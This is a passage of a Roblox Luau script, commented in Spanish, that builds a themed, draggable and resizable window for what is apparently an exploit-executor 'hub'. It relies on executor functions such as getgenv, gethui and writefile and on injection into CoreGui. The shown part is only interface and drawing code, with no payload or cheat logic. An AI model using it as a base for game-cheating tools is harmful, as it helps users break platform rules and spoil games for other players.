do -- tamanos guardados: siempre dentro de los limites
	local L = SIZE_LIMITS
	settings.scale = math.clamp(settings.scale, 0.6, 1.4)           -- scale = 0 dejaba el hub invisible para siempre
	settings.transparency = math.clamp(settings.transparency, 0, 0.6)
	settings.bgArtOpacity = math.clamp(settings.bgArtOpacity, 0, 1)
	settings.volume = math.clamp(settings.volume, 0, 1)
	settings.hubW = math.clamp(settings.hubW, L.hub.minW, L.hub.maxW)
	settings.hubH = math.clamp(settings.hubH, L.hub.minH, L.hub.maxH)
	settings.uniW = math.clamp(settings.uniW, L.uni.minW, L.uni.maxW)
	settings.uniH = math.clamp(settings.uniH, L.uni.minH, L.uni.maxH)
end

local function saveSettings()
	if not writefile then return end
	pcall(function() writefile(SETTINGS_FILE, HttpService:JSONEncode(settings)) end)
end

local saveToken = 0
local function queueSave()
	saveToken += 1
	local t = saveToken
	task.delay(0.6, function()
		if t == saveToken then saveSettings() end
	end)
end

-- ===================================================================
-- TEMA
-- ===================================================================
local presetAsset = nil   -- imagen de fondo del preset activo (si tiene y se pudo cargar)
local bgAsset = nil   -- imagen de fondo personalizada ya resuelta (rbxasset / rbxassetid)
local BASE_TEXT = Color3.fromRGB(240, 240, 248)
local BASE_SUB = Color3.fromRGB(135, 135, 158)
local T = {}   -- estilo activo (fuentes, redondeo, bordes, decoracion)
local C = {
	text = BASE_TEXT,
	sub = BASE_SUB,
	onAccent = Color3.new(1, 1, 1),
	green = Color3.fromRGB(62, 200, 120),
	red = Color3.fromRGB(235, 87, 87),
	amber = Color3.fromRGB(245, 176, 65),
	white = Color3.new(1, 1, 1),
}

local function findByName(list, name)
	for _, item in list do
		if item.name == name then return item end
	end
	return list[1]
end

local function applyTheme()
	local p = findByName(PRESETS, settings.preset)
	local style = STYLES[p.style] or STYLES.modern
	table.clear(T)
	for k, v in style do T[k] = v end

	if p.colors then
		local c = p.colors
		C.bg, C.card, C.card2, C.line = c.bg, c.card, c.card2, c.line
		C.accent, C.accent2 = c.accent, c.accent2
		C.text, C.sub, C.onAccent = c.text, c.sub, c.onAccent
	else
		local a = findByName(ACCENTS, settings.accent)
		local b = findByName(BACKGROUNDS, settings.background)
		C.accent, C.accent2 = a.a, a.b
		C.bg, C.card, C.card2, C.line = b.bg, b.card, b.card2, b.line
		C.text, C.sub, C.onAccent = BASE_TEXT, BASE_SUB, Color3.new(1, 1, 1)
	end
end
applyTheme()

local HEADER_H = 56

local env = (getgenv and getgenv()) or _G
if env.__HubCleanup then pcall(env.__HubCleanup) end
if env.__UniversalCleanup then pcall(env.__UniversalCleanup) end

-- ===================================================================
-- UI HELPERS
-- ===================================================================
local function getGuiParent()
	if gethui then
		local ok, ui = pcall(gethui)
		if ok and ui then return ui end
	end
	local ok, core = pcall(function() return game:GetService("CoreGui") end)
	if ok and core then
		local probe = Instance.new("Folder")
		local wrote = pcall(function() probe.Parent = core end)
		probe:Destroy()
		if wrote then return core end
	end
	return player:WaitForChild("PlayerGui")
end

local function themedFont(f)
	if f == Enum.Font.GothamBold or f == Enum.Font.GothamBlack then return T.fontBold end
	if f == Enum.Font.GothamMedium or f == Enum.Font.GothamSemibold then return T.fontMedium end
	if f == Enum.Font.Gotham then return T.font end
	return f
end

local function new(class, props, parent)
	local inst = Instance.new(class)
	for k, v in props do
		if k == "Font" then
			v = themedFont(v)
		elseif k == "TextSize" then
			v = math.max(8, math.floor(v * T.textScale + 0.5))
		end
		inst[k] = v
	end
	if T.textStroke and (class == "TextLabel" or class == "TextButton" or class == "TextBox") then
		inst.TextStrokeTransparency = T.textStroke
		inst.TextStrokeColor3 = Color3.new(0, 0, 0)
	end
	-- relieve de bloque: brillo arriba y sombra abajo en los botones con fondo
	if T.bevel and class == "TextButton" and inst.BackgroundTransparency < 1 then
		new("Frame", {
			Size = UDim2.new(1, 0, 0, 2), BackgroundColor3 = Color3.new(1, 1, 1),
			BackgroundTransparency = 0.55, BorderSizePixel = 0,
		}, inst)
		new("Frame", {
			Size = UDim2.new(1, 0, 0, 3), Position = UDim2.new(0, 0, 1, -3),
			BackgroundColor3 = Color3.new(0, 0, 0), BackgroundTransparency = 0.7, BorderSizePixel = 0,
		}, inst)
	end
	if parent then inst.Parent = parent end
	return inst
end

local function tw(inst, props, t, style)
	TweenService:Create(
		inst,
		TweenInfo.new(t or 0.16, style or Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
		props
	):Play()
end

local function round(inst, r)
	return new("UICorner", { CornerRadius = UDim.new(0, math.floor((r or 8) * T.round + 0.5)) }, inst)
end

local function outline(inst, color, thickness)
	return new("UIStroke", {
		Color = color or C.line,
		Thickness = (thickness or 1) * T.stroke,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
	}, inst)
end

local function gradient(inst, c1, c2, rotation)
	return new("UIGradient", { Color = ColorSequence.new(c1, c2), Rotation = rotation or 0 }, inst)
end

local function padding(inst, l, t, r, b)
	return new("UIPadding", {
		PaddingLeft = UDim.new(0, l), PaddingTop = UDim.new(0, t),
		PaddingRight = UDim.new(0, r), PaddingBottom = UDim.new(0, b),
	}, inst)
end

local function label(parent, props)
	local d = {
		BackgroundTransparency = 1,
		TextColor3 = C.text,
		Font = Enum.Font.Gotham,
		TextSize = 12,
		TextXAlignment = Enum.TextXAlignment.Left,
		Text = "",
	}
	for k, v in props do d[k] = v end
	return new("TextLabel", d, parent)
end

local function card(parent, height, order)
	local f = new("Frame", {
		Size = UDim2.new(1, 0, 0, height),
		AutomaticSize = height == 0 and Enum.AutomaticSize.Y or Enum.AutomaticSize.None,
		BackgroundColor3 = C.card,
		BackgroundTransparency = settings.bgArt and 0.12 or 0,
		BorderSizePixel = 0,
		LayoutOrder = order or 0,
	}, parent)
	round(f, 12)
	outline(f, C.line)
	return f
end

local function hover(btn, normal, over)
	btn.MouseEnter:Connect(function() tw(btn, { BackgroundColor3 = over }, 0.12) end)
	btn.MouseLeave:Connect(function() tw(btn, { BackgroundColor3 = normal }, 0.12) end)
end

local function sequence()
	local n = 0
	return function()
		n += 1
		return n
	end
end

local function clearChildren(parent)
	for _, child in parent:GetChildren() do
		if not (child:IsA("UIListLayout") or child:IsA("UIPadding") or child:IsA("UIGridLayout")) then
			child:Destroy()
		end
	end
end

local function hashColor(str)
	local h = 0
	for i = 1, #str do h = (h * 31 + string.byte(str, i)) % 360 end
	return Color3.fromHSV(h / 360, 0.55, 0.8)
end

-- primera letra (soporta UTF-8: antes un nombre que empezaba por emoji/kanji mostraba un caracter roto)
local function firstChar(s)
	local ch = tostring(s or ""):match(utf8.charpattern)
	return string.upper(ch or "?")
end

local function formatViews(n)
	n = tonumber(n) or 0
	if n >= 1e6 then return ("%.1fM"):format(n / 1e6) end
	if n >= 1e3 then return ("%.1fK"):format(n / 1e3) end
	return tostring(n)
end

local function makeDraggable(handle, target, connList, scaleObj, onEnd)
	local dragging, dragInput, dragStart, startPos = false, nil, nil, nil
	handle.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1
			or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragInput = input
			dragStart = input.Position
			startPos = target.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End and dragInput == input then
					dragging = false
					dragInput = nil
					if onEnd then pcall(onEnd) end
				end
			end)
		end
	end)
	table.insert(connList, UserInputService.InputChanged:Connect(function(input)
		-- FIX: con varios dedos en pantalla, solo mueve el dedo que empezo el arrastre
		if dragging and (input == dragInput or input.UserInputType == Enum.UserInputType.MouseMovement) then
			local d = (input.Position - dragStart) / (scaleObj and scaleObj.Scale or 1)
			target.Position = UDim2.new(
				startPos.X.Scale, startPos.X.Offset + d.X,
				startPos.Y.Scale, startPos.Y.Offset + d.Y
			)
		end
	end))
end

-- ===================================================================
-- FONDOS TEMATICOS
-- Dibujados con codigo (originales). No usan imagenes, logos ni personajes de nadie.
-- ===================================================================
local ART = {}

local function block(parent, x, y, w, h, color, alpha, props)
	local f = new("Frame", {
		Position = UDim2.fromOffset(x, y),
		Size = UDim2.fromOffset(w, h),
		BackgroundColor3 = color,
		BackgroundTransparency = 1 - (alpha or 1),
		BorderSizePixel = 0,
	}, parent)
	if props then
		for k, v in props do f[k] = v end
	end
	return f
end

local function circle(parent, x, y, d, color, alpha)
	local f = block(parent, x, y, d, d, color, alpha)
	new("UICorner", { CornerRadius = UDim.new(1, 0) }, f)
	return f
end

local function segment(parent, x1, y1, x2, y2, thickness, color, alpha)
	local dx, dy = x2 - x1, y2 - y1
	local len = math.sqrt(dx * dx + dy * dy)
	return block(parent, (x1 + x2) / 2, (y1 + y2) / 2, len, thickness, color, alpha, {
		AnchorPoint = Vector2.new(0.5, 0.5),
		Rotation = math.deg(math.atan2(dy, dx)),
	})
end

-- estilo "modern": luces suaves del color de acento
ART.modern = function(L, w, h)
	circle(L, -90, -90, 280, C.accent, 0.20)
	circle(L, w - 190, h * 0.42, 320, C.accent2, 0.16)
	circle(L, w * 0.25, h - 130, 220, C.accent, 0.12)
end

-- plataformas 8-bit (escena original): cielo, nubes, colinas, ladrillos, monedas y dos
-- personajes inventados (un robot y un slime). No usa personajes ni graficos de nadie.
ART.mario = function(L, w, h)
	local sky = block(L, 0, 0, w, h, C.white, 1)
	gradient(sky, Color3.fromRGB(130, 178, 255), Color3.fromRGB(92, 148, 252), 90)

	local function cloud(x, y, s)
		circle(L, x, y + 8 * s, 28 * s, C.white, 1)
		circle(L, x + 20 * s, y - 6 * s, 36 * s, C.white, 1)
		circle(L, x + 46 * s, y + 8 * s, 28 * s, C.white, 1)
		block(L, x + 14 * s, y + 20 * s, 48 * s, 16 * s, C.white, 1)
	end
	cloud(w * 0.08, h * 0.10, 1)
	cloud(w * 0.62, h * 0.07, 0.8)
	cloud(w * 0.36, h * 0.28, 0.6)

	local groundH = 40
	local gy = h - groundH

	local darkGreen, green, light = Color3.fromRGB(0, 60, 0), Color3.fromRGB(0, 168, 0), Color3.fromRGB(96, 224, 80)
	local hill1 = circle(L, w * 0.04 - 30, gy - 78, 230, green, 1)
	new("UIStroke", { Color = darkGreen, Thickness = 2 }, hill1)
	local hill2 = circle(L, w * 0.60, gy - 44, 170, light, 1)
	new("UIStroke", { Color = darkGreen, Thickness = 2 }, hill2)
	for i = 0, 2 do
		local bush = circle(L, w * 0.34 + i * 22, gy - 22 + (i == 1 and -8 or 0), 40, light, 1)
		new("UIStroke", { Color = darkGreen, Thickness = 2 }, bush)
	end

	local function brickWall(x, y, bw, bh)
		block(L, x, y, bw, bh, Color3.fromRGB(200, 76, 12), 1)
		local mortar = Color3.fromRGB(20, 12, 8)
		for r = 0, math.ceil(bh / 8) - 1 do
			block(L, x, y + r * 8, bw, 1, mortar, 0.9)
			local off = (r % 2 == 0) and 0 or 8
			for cx = x + off, x + bw, 16 do
				block(L, cx, y + r * 8, 1, 8, mortar, 0.9)
			end
		end
	end

	brickWall(w * 0.52, h * 0.52, 80, 16)
	brickWall(w * 0.10, h * 0.40, 48, 16)

	local gold = Color3.fromRGB(252, 188, 60)
	for i = 0, 2 do
		local coin = block(L, w * 0.52 + 16 + i * 22, h * 0.52 - 30, 10, 14, gold, 1)
		new("UICorner", { CornerRadius = UDim.new(1, 0) }, coin)
		new("UIStroke", { Color = Color3.fromRGB(150, 90, 0), Thickness = 1 }, coin)
	end

	-- tuberias verdes (borde oscuro, brillo a la izquierda y sombra a la derecha)
	local pipeGreen = Color3.fromRGB(0, 168, 0)
	local pipeLight = Color3.fromRGB(128, 208, 16)
	local pipeDark = Color3.fromRGB(0, 76, 0)
	local pipeLine = Color3.fromRGB(8, 28, 8)
	local function pipe(x, height, bodyW)
		local lipH, lipExtra = 18, 4
		local topY = gy - height
		local body = block(L, x, topY + lipH, bodyW, height - lipH + 2, pipeGreen, 1)
		new("UIStroke", { Color = pipeLine, Thickness = 2 }, body)
		block(L, x + 4, topY + lipH, 6, height - lipH, pipeLight, 1)
		block(L, x + bodyW - 9, topY + lipH, 6, height - lipH, pipeDark, 0.7)

		local lip = block(L, x - lipExtra, topY, bodyW + lipExtra * 2, lipH, pipeGreen, 1)
		new("UIStroke", { Color = pipeLine, Thickness = 2 }, lip)
		block(L, x - lipExtra + 4, topY + 3, 6, lipH - 6, pipeLight, 1)
		block(L, x + bodyW + lipExtra - 10, topY + 3, 6, lipH - 6, pipeDark, 0.7)
	end
	pipe(w * 0.44, 56, 36)
	pipe(w * 0.84, 84, 36)
	pipe(w * 0.20, 40, 30)

	brickWall(0, gy, w, groundH)

	local function sprite(rows, palette, x, y, px)
		for r, row in rows do
			for c = 1, #row do
				local color = palette[row:sub(c, c)]
				if color then
					block(L, x + (c - 1) * px, y + (r - 1) * px, px, px, color, 1)
				end
			end
		end
	end

	local robot = {
		"...yy...", "..bbbb..", ".bbbbbb.", ".bwebwe.", ".bbbbbb.",
		"..bbbb..", ".bbbbbb.", ".bb..bb.", ".bb..bb.",
	}
	sprite(robot, {
		b = Color3.fromRGB(60, 190, 200), w = Color3.fromRGB(255, 255, 255),
		e = Color3.fromRGB(20, 30, 60), y = Color3.fromRGB(252, 220, 60),
	}, w * 0.08, gy - 36, 4)

	local slime = { "..pppp..", ".pppppp.", "pwepwepp", "pppppppp", "pppppppp" }
	sprite(slime, {
		p = Color3.fromRGB(150, 90, 220), w = Color3.fromRGB(255, 255, 255), e = Color3.fromRGB(20, 20, 40),
	}, w * 0.72, gy - 20, 4)
end

-- lluvia de codigo (terminal)
ART.matrix = function(L, w, h)
	local rng = Random.new(11)
	local c1, c2 = Color3.fromRGB(0, 255, 90), Color3.fromRGB(190, 255, 200)
	for x = 6, w - 6, 16 do
		local len = rng:NextInteger(3, 8)
		local top = rng:NextInteger(0, math.max(1, h - len * 14 - 10))
		for i = 0, len - 1 do
			block(L, x, top + i * 14, 7, 10, (i == len - 1) and c2 or c1, (0.15 + 0.85 * (i / len)) * 0.6)
		end
	end
end

-- atardecer retro: sol con cortes, suelo con rejilla
ART.synth = function(L, w, h)
	local sky = block(L, 0, 0, w, h, C.white, 1)
	gradient(sky, Color3.fromRGB(30, 8, 60), Color3.fromRGB(125, 20, 115), 90)
	local horizon = h * 0.62
	local sunD = math.min(w * 0.5, 190)
	local sunY = horizon - sunD * 0.85
	local sun = circle(L, w / 2 - sunD / 2, sunY, sunD, C.white, 1)
	gradient(sun, Color3.fromRGB(255, 225, 90), Color3.fromRGB(255, 50, 150), 90)
	local cut, r, cy = Color3.fromRGB(70, 12, 90), sunD / 2, sunY + sunD / 2
	for i = 1, 5 do
		local y0, t = sunY + sunD * (0.42 + i * 0.1), 2 + i
		local dy = math.max(math.abs(y0 - cy), math.abs(y0 + t - cy))
		if dy < r then
			local hw = math.sqrt(r * r - dy * dy)
			block(L, w / 2 - hw, y0, hw * 2, t, cut, 1)
		end
	end
	block(L, 0, horizon, w, h - horizon, Color3.fromRGB(18, 4, 40), 1)
	local line = Color3.fromRGB(255, 60, 200)
	local y, step = horizon + 4, 5
	while y < h do
		block(L, 0, y, w, 1, line, 0.8)
		y += step
		step *= 1.35
	end
	for i = -8, 8 do
		segment(L, w / 2 + i * 14, horizon, w / 2 + i * w * 0.16, h, 1, line, 0.7)
	end
end

-- cielo nocturno: nebulosas, estrellas y luna
ART.stars = function(L, w, h)
	local sky = block(L, 0, 0, w, h, C.white, 1)
	gradient(sky, Color3.fromRGB(10, 8, 40), Color3.fromRGB(42, 14, 82), 90)
	circle(L, w * 0.62, -70, 280, C.accent, 0.18)
	circle(L, -90, h * 0.5, 320, C.accent2, 0.12)
	local rng = Random.new(5)
	for _ = 1, math.floor(w * h / 5000) do
		circle(L, rng:NextNumber(0, w), rng:NextNumber(0, h), rng:NextInteger(1, 3), Color3.new(1, 1, 1), rng:NextNumber(0.35, 1))
	end
	circle(L, w * 0.8, h * 0.08, 46, Color3.fromRGB(240, 240, 255), 0.85)
	circle(L, w * 0.8 + 10, h * 0.08 + 12, 9, Color3.fromRGB(200, 200, 225), 0.8)
	circle(L, w * 0.8 + 26, h * 0.08 + 26, 6, Color3.fromRGB(200, 200, 225), 0.8)
end

-- cerezo en flor: rama, flores y petalos cayendo
ART.sakura = function(L, w, h)
	local sky = block(L, 0, 0, w, h, C.white, 1)
	gradient(sky, Color3.fromRGB(255, 240, 246), Color3.fromRGB(255, 208, 224), 90)
	circle(L, w * 0.68, h * 0.07, 90, Color3.fromRGB(255, 160, 175), 0.35)
	local wood = Color3.fromRGB(115, 72, 72)
	segment(L, w + 10, h * 0.18, w * 0.55, h * 0.3, 6, wood, 1)
	segment(L, w * 0.78, h * 0.24, w * 0.66, h * 0.14, 4, wood, 1)
	local rng = Random.new(3)
	local petal = Color3.fromRGB(255, 150, 185)
	for _ = 1, 22 do
		local x, y, s = w * rng:NextNumber(0.5, 1), h * rng:NextNumber(0.08, 0.34), rng:NextInteger(10, 18)
		circle(L, x, y, s, petal, 0.75)
		circle(L, x + s * 0.3, y + s * 0.3, s * 0.35, Color3.fromRGB(255, 230, 120), 0.9)
	end
	for _ = 1, math.floor(w * h / 9000) do
		local f = block(L, rng:NextNumber(0, w), rng:NextNumber(0.1, 1) * h, rng:NextInteger(5, 9), rng:NextInteger(3, 5),
			petal, rng:NextNumber(0.3, 0.7), { Rotation = rng:NextInteger(0, 180) })
		new("UICorner", { CornerRadius = UDim.new(1, 0) }, f)
	end
end

-- Ventana base: header con logo, minimizar, cerrar, animacion de entrada y salida
local function buildWindow(cfg)
	local g = new("ScreenGui", {
		Name = cfg.name,
		ResetOnSpawn = false,
		ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
		DisplayOrder = cfg.order or 10,
	})
	g.Parent = getGuiParent()

	local cam = workspace.CurrentCamera
	local autoScale = math.clamp((cam and cam.ViewportSize.Y or 720) / 720, 0.65, 1)
	local uiScale = new("UIScale", { Scale = autoScale * settings.scale }, g)

	-- tamano actual de la ventana (cambia al arrastrar la esquina inferior derecha)
	local minW, minH = cfg.minW or cfg.width, cfg.minH or cfg.height
	local maxW, maxH = cfg.maxW or cfg.width, cfg.maxH or cfg.height
	local curW = math.clamp(cfg.width, minW, maxW)
	local curH = math.clamp(cfg.height, minH, maxH)

	local offset = UDim2.fromOffset(0, 16)
	local win = new("CanvasGroup", {
		Size = UDim2.fromOffset(curW, curH),
		Position = cfg.instant and cfg.position or (cfg.position + offset),
		BackgroundColor3 = C.bg,
		BorderSizePixel = 0,
		GroupTransparency = cfg.instant and settings.transparency or 1,
	}, g)
	round(win, 14)
	outline(win, C.line)

	-- capa de fondo (arte del preset o imagen propia); la intensidad se controla con GroupTransparency
	local bgLayer = new("CanvasGroup", {
		Size = UDim2.fromScale(1, 1),
		BackgroundTransparency = 1,
		ZIndex = 0,
		GroupTransparency = 1 - settings.bgArtOpacity,
		Visible = settings.bgArt,
	}, win)
	local bgImageAsset = bgAsset or presetAsset
	if bgImageAsset then
		new("ImageLabel", {
			Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1,
			Image = bgImageAsset, ScaleType = Enum.ScaleType.Crop,
		}, bgLayer)
	else
		local builder = ART[T.art] or ART.modern
		pcall(builder, bgLayer, curW, curH)
	end
	-- el arte dibujado por codigo se reconstruye al terminar de redimensionar (para que cubra toda la ventana)
	local function rebuildArt()
		if bgImageAsset then return end
		for _, child in bgLayer:GetChildren() do child:Destroy() end
		local builder = ART[T.art] or ART.modern
		pcall(builder, bgLayer, curW, curH)
	end

	local header = new("Frame", {
		Size = UDim2.new(1, 0, 0, HEADER_H),
		BackgroundColor3 = C.white,
		BackgroundTransparency = settings.bgArt and 0.15 or 0,
		BorderSizePixel = 0,
	}, win)
	gradient(header, C.card, T.flatHeader and C.card or C.bg, 90)
	new("Frame", {
		Size = UDim2.new(1, 0, 0, 1),
		Position = UDim2.new(0, 0, 1, -1),
		BackgroundColor3 = C.line,
		BorderSizePixel = 0,
	}, header)

	-- decoracion del estilo: franja de ladrillos al pie de la cabecera
	if T.deco == "bricks" then
		local strip = new("Frame", {
			Size = UDim2.new(1, 0, 0, 8), Position = UDim2.new(0, 0, 1, -8),
			BackgroundColor3 = Color3.fromRGB(232, 120, 48), BorderSizePixel = 0, ClipsDescendants = true,
		}, header)
		local mortar = Color3.fromRGB(20, 12, 8)
		for r = 0, 1 do
			new("Frame", {
				Size = UDim2.new(1, 0, 0, 1), Position = UDim2.fromOffset(0, r * 4),
				BackgroundColor3 = mortar, BackgroundTransparency = 0.1, BorderSizePixel = 0,
			}, strip)
			local off = (r % 2 == 0) and 0 or 8
			for cx = off, math.max(maxW, curW), 16 do
				new("Frame", {
					Size = UDim2.fromOffset(1, 4), Position = UDim2.fromOffset(cx, r * 4),
					BackgroundColor3 = mortar, BackgroundTransparency = 0.1, BorderSizePixel = 0,
				}, strip)
			end
		end
	end

	local logo = new("Frame", {
		Size = UDim2.fromOffset(34, 34),
		Position = UDim2.fromOffset(14, 11),
		BackgroundColor3 = C.white,
		BorderSizePixel = 0,
	}, header)
	round(logo, 10)
	gradient(logo, C.accent, C.accent2, 45)
	label(logo, {
		Size = UDim2.fromScale(1, 1),
		Text = cfg.icon or "S",
		TextColor3 = C.onAccent,
		Font = Enum.Font.GothamBold,
		TextSize = 17,
		TextXAlignment = Enum.TextXAlignment.Center,
	})

	label(header, {
		Position = UDim2.fromOffset(58, 10),
		Size = UDim2.new(1, -140, 0, 18),
		Text = cfg.title,
		Font = Enum.Font.GothamBold,
		TextSize = 15,
	})
	label(header, {
		Position = UDim2.fromOffset(58, 29),
		Size = UDim2.new(1, -140, 0, 14),
		Text = cfg.subtitle or "",
		TextSize = 11,
		TextColor3 = C.sub,
	})

	local function headerButton(text, xOffset, overColor)
		local b = new("TextButton", {
			Size = UDim2.fromOffset(28, 28),
			Position = UDim2.new(1, xOffset, 0, 14),
			BackgroundColor3 = C.card2,
			Text = text,
			TextColor3 = C.text,
			Font = Enum.Font.GothamBold,
			TextSize = 14,
			AutoButtonColor = false,
		}, header)
		round(b, 8)
		hover(b, C.card2, overColor)
		return b
	end
	local minBtn = headerButton("–", -70, C.line)
	local closeBtn = headerButton("✕", -38, C.red)

	local content = new("Frame", {
		Size = UDim2.new(1, 0, 1, -HEADER_H),
		Position = UDim2.fromOffset(0, HEADER_H),
		BackgroundTransparency = 1,
	}, win)

	-- zona de arrastre: no cubre los botones de minimizar / cerrar (evita toques cruzados en el movil)
	-- FIX: la ventana ya no se puede perder fuera de la pantalla (ni al arrastrarla ni al abrirse)
	local function keepOnScreen(strict)
		if not g.Parent then return end
		local area = g.AbsoluteSize
		if area.X < 1 or area.Y < 1 then return end
		local okp, gpos = pcall(function() return g.AbsolutePosition end)
		local origin = (okp and typeof(gpos) == "Vector2") and gpos or Vector2.zero
		local pos, size = win.AbsolutePosition - origin, win.AbsoluteSize
		local dx, dy = 0, 0
		if strict then
			local function fit(p, sz, total)
				if sz >= total then return -p end
				if p < 0 then return -p end
				if p + sz > total then return total - (p + sz) end
				return 0
			end
			dx, dy = fit(pos.X, size.X, area.X), fit(pos.Y, size.Y, area.Y)
		else
			local keep = 72
			if pos.X + size.X < keep then dx = keep - (pos.X + size.X)
			elseif pos.X > area.X - keep then dx = (area.X - keep) - pos.X end
			local headerPx = HEADER_H * uiScale.Scale
			if pos.Y < 0 then dy = -pos.Y
			elseif pos.Y > area.Y - headerPx then dy = (area.Y - headerPx) - pos.Y end
		end
		if dx ~= 0 or dy ~= 0 then
			local sc = math.max(uiScale.Scale, 0.01)
			win.Position = win.Position + UDim2.fromOffset(dx / sc, dy / sc)
		end
	end

	local dragHandle = new("Frame", {
		Size = UDim2.new(1, -84, 1, 0), BackgroundTransparency = 1, Active = true, ZIndex = 2,
	}, header)
	makeDraggable(dragHandle, win, cfg.conns, uiScale, function() keepOnScreen(false) end)

	-- ---------- esquina para redimensionar (abajo a la derecha) ----------
	local resizing, resizeInput, startMouse, startW, startH = false, nil, nil, 0, 0
	local grip = new("TextButton", {
		Name = "ResizeGrip",
		Size = UDim2.fromOffset(32, 32),
		AnchorPoint = Vector2.new(1, 1),
		Position = UDim2.fromScale(1, 1),
		BackgroundTransparency = 1,
		Text = "",
		AutoButtonColor = false,
		ZIndex = 40,
	}, win)
	local gripDots = {}
	for _, d in { { 21, 21 }, { 14, 21 }, { 21, 14 }, { 7, 21 }, { 14, 14 }, { 21, 7 } } do
		local dot = new("Frame", {
			Size = UDim2.fromOffset(3, 3), Position = UDim2.fromOffset(d[1], d[2]),
			BackgroundColor3 = C.sub, BackgroundTransparency = 0.2, BorderSizePixel = 0, ZIndex = 41,
		}, grip)
		round(dot, 2)
		table.insert(gripDots, dot)
	end
	local function paintGrip(color)
		for _, dot in gripDots do tw(dot, { BackgroundColor3 = color }, 0.12) end
	end
	grip.MouseEnter:Connect(function() paintGrip(C.accent) end)
	grip.MouseLeave:Connect(function() if not resizing then paintGrip(C.sub) end end)

	-- limite por pantalla: la ventana no puede crecer mas alla del borde de la pantalla
	local function sizeLimits()
		local area = g.AbsoluteSize
		if area.X < 1 or area.Y < 1 then
			area = (cam and cam.ViewportSize) or Vector2.new(1280, 720)
		end
		local okp, gpos = pcall(function() return g.AbsolutePosition end)
		local origin = (okp and typeof(gpos) == "Vector2") and gpos or Vector2.zero
		local rel = win.AbsolutePosition - origin
		local s = math.max(uiScale.Scale, 0.01)
		local limW = math.max(minW, math.min(maxW, (area.X - rel.X) / s - 6))
		local limH = math.max(minH, math.min(maxH, (area.Y - rel.Y) / s - 6))
		return limW, limH
	end

	local function applySize(w, h)
		local limW, limH = sizeLimits()
		curW = math.floor(math.clamp(w, minW, limW) + 0.5)
		curH = math.floor(math.clamp(h, minH, limH) + 0.5)
		win.Size = UDim2.fromOffset(curW, curH)
	end

	local function endResize()
		if not resizing then return end
		resizing, resizeInput = false, nil
		paintGrip(C.sub)
		if curW == startW and curH == startH then return end
		rebuildArt()
		if cfg.onResize then cfg.onResize(curW, curH) end
	end

	local lastTap = 0
	grip.InputBegan:Connect(function(input)
		if input.UserInputType ~= Enum.UserInputType.MouseButton1
			and input.UserInputType ~= Enum.UserInputType.Touch then return end
		local now = os.clock()
		if now - lastTap < 0.35 then -- doble toque: tamano original
			lastTap = 0
			applySize(cfg.defaultW or curW, cfg.defaultH or curH)
			rebuildArt()
			if cfg.onResize then cfg.onResize(curW, curH) end
			return
		end
		lastTap = now
		resizing, resizeInput = true, input
		startMouse, startW, startH = input.Position, curW, curH
		paintGrip(C.accent)
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then endResize() end
		end)
	end)
	table.insert(cfg.conns, UserInputService.InputChanged:Connect(function(input)
		if not resizing then return end
		if input == resizeInput or input.UserInputType == Enum.UserInputType.MouseMovement then
			local d = (input.Position - startMouse) / math.max(uiScale.Scale, 0.01)
			applySize(startW + d.X, startH + d.Y)
		end
	end))
	table.insert(cfg.conns, UserInputService.InputEnded:Connect(function(input)
		if not resizing then return end
		if input == resizeInput or (input.UserInputType == Enum.UserInputType.MouseButton1
			and resizeInput and resizeInput.UserInputType == Enum.UserInputType.MouseButton1) then
			endResize()
		end
	end))

	local minimized = false
	local function setMinimized(v)
		minimized = v
		minBtn.Text = minimized and "+" or "–"
		if minimized then content.Visible = false end
		grip.Visible = not minimized
		tw(win, { Size = UDim2.fromOffset(curW, minimized and HEADER_H or curH) }, 0.24, Enum.EasingStyle.Quint)
		if not minimized then
			task.delay(0.12, function()
				if not minimized then content.Visible = true end
			end)
		end
	end
	minBtn.Activated:Connect(function() setMinimized(not minimized) end)

	local function close()
		tw(win, { GroupTransparency = 1, Position = win.Position + offset }, 0.18)
		task.delay(0.2, function() g:Destroy() end)
	end
	-- ---------- "Are you sure?" al cerrar ----------
	local askOverlay, askProceed
	local function askClose(proceed)
		if minimized then setMinimized(false) end
		if not askOverlay then
			askOverlay = new("Frame", {
				Name = "CloseConfirm", Size = UDim2.fromScale(1, 1), BackgroundColor3 = Color3.new(0, 0, 0),
				BackgroundTransparency = 0.35, BorderSizePixel = 0, Active = true, Visible = false, ZIndex = 80,
			}, win)
			local dlg = new("Frame", {
				Size = UDim2.new(1, -56, 0, 0), AutomaticSize = Enum.AutomaticSize.Y,
				AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
				BackgroundColor3 = C.card, BorderSizePixel = 0,
			}, askOverlay)
			round(dlg, 14)
			outline(dlg, C.line)
			padding(dlg, 16, 16, 16, 16)
			new("UIListLayout", { Padding = UDim.new(0, 10), SortOrder = Enum.SortOrder.LayoutOrder }, dlg)
			label(dlg, {
				Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y, LayoutOrder = 1,
				Font = Enum.Font.GothamBold, TextSize = 14, TextWrapped = true,
				Text = cfg.confirmTitle or "Are you sure you want to close?",
			})
			label(dlg, {
				Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y, LayoutOrder = 2,
				TextSize = 11, TextColor3 = C.sub, TextWrapped = true, TextYAlignment = Enum.TextYAlignment.Top,
				Text = cfg.confirmBody or "This window will close.",
			})
			local row = new("Frame", { Size = UDim2.new(1, 0, 0, 34), BackgroundTransparency = 1, LayoutOrder = 3 }, dlg)
			local stay = new("TextButton", {
				Size = UDim2.new(0.5, -4, 1, 0), BackgroundColor3 = C.card2, Text = "Keep open", TextColor3 = C.text,
				Font = Enum.Font.GothamMedium, TextSize = 13, AutoButtonColor = false,
			}, row)
			round(stay, 10)
			hover(stay, C.card2, C.line)
			local yes = new("TextButton", {
				Size = UDim2.new(0.5, -4, 1, 0), Position = UDim2.new(0.5, 4, 0, 0), BackgroundColor3 = C.red,
				Text = "Yes, close", TextColor3 = Color3.new(1, 1, 1),
				Font = Enum.Font.GothamBold, TextSize = 13, AutoButtonColor = false,
			}, row)
			round(yes, 10)
